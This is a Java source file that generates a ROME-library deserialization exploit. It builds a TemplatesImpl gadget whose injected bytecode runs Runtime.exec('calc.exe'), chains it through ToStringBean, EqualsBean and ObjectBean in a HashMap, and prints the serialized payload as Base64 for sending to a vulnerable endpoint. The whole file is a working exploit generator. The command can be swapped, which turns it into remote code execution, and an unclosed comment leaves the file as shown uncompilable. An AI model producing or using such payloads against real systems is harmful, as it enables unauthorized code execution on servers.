import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ObjectBean;
import com.sun.syndication.feed.impl.ToStringBean;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

/*
 * ObjectBean#toString()
 * BadAttributeValueExpException#toString()
 * XString#toString





public class rome {
    public static void main(String[] args) throws Exception{
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.makeClass("i");
        CtClass superClass = pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
        ctClass.setSuperclass(superClass);
        CtConstructor constructor = ctClass.makeClassInitializer();
        constructor.setBody("Runtime.getRuntime().exec(\"calc.exe\");");
        byte[] bytes = ctClass.toBytecode();
        System.out.println(bytes);

        TemplatesImpl templatesImpl = new TemplatesImpl();
        setFieldValue(templatesImpl, "_bytecodes", new byte[][]{bytes});
        setFieldValue(templatesImpl, "_name", "a");
        setFieldValue(templatesImpl, "_tfactory", null);

        ToStringBean toStringBean = new ToStringBean(Templates.class, templatesImpl);
//        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
//        setFieldValue(badAttributeValueExpException,"val",toStringBean);
        ObjectBean objectBean = new ObjectBean(String.class,"whatever");
        Map hashMap = new HashMap();
        hashMap.put(objectBean, "x");

        setFieldValue(objectBean,"_equalsBean",new EqualsBean(ToStringBean.class, toStringBean));

        setFieldValue(objectBean, "_cloneableBean", null);
        setFieldValue(objectBean, "_toStringBean", null);



        // 执行序列化与反序列化，并且返回序列化数据
//        ByteArrayOutputStream bs = unSerial(hashMap);
        // 输出序列化的Base64编码字符
        ByteArrayOutputStream bao = new ByteArrayOutputStream();
        ObjectOutputStream out = new ObjectOutputStream(bao);
        out.writeObject(hashMap);
        ByteArrayInputStream oin = new ByteArrayInputStream(bao.toByteArray());
        ObjectInputStream in = new ObjectInputStream(oin);
//        in.readObject();
        Base64Encode(bao);
    }

    private static ByteArrayOutputStream unSerial(Map hashMap) throws Exception{
        ByteArrayOutputStream bs = new ByteArrayOutputStream();
        ObjectOutputStream out = new ObjectOutputStream(bs);
        out.writeObject(hashMap);
        ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(bs.toByteArray()));
        in.readObject();
        in.close();
        return bs;
    }
    private static void Base64Encode(ByteArrayOutputStream bs){
//        byte[] encode = Base64.getEncoder().encode(bs.toByteArray());
//        String s = new String(encode);
        String s = Base64.getEncoder().encodeToString(bs.toByteArray());
        System.out.println(s);
        System.out.println(s.length());
    }
    private static void setFieldValue(Object obj, String field, Object arg) throws Exception{
        Field f = obj.getClass().getDeclaredField(field);
        f.setAccessible(true);
        f.set(obj, arg);
    }
}
